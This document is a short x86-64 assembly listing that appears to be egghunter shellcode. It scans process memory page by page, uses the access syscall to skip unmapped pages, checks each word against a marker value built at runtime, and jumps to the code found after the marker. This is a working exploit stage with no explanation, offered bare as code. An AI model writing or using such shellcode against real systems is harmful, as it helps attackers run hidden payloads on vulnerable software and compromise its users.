global _start
section .text
_start:
        xor rsi,rsi

        push rsi ; starts the search at position 0
        pop rdi

next_page:
        or di,0xfff
        inc rdi

next_4_bytes:
        push 21
        pop rax
        syscall
        cmp al,0xf2
        jz next_page
        mov eax,0xefbeefbd
        inc al
        scasd
        jnz next_4_bytes
        jmp rdi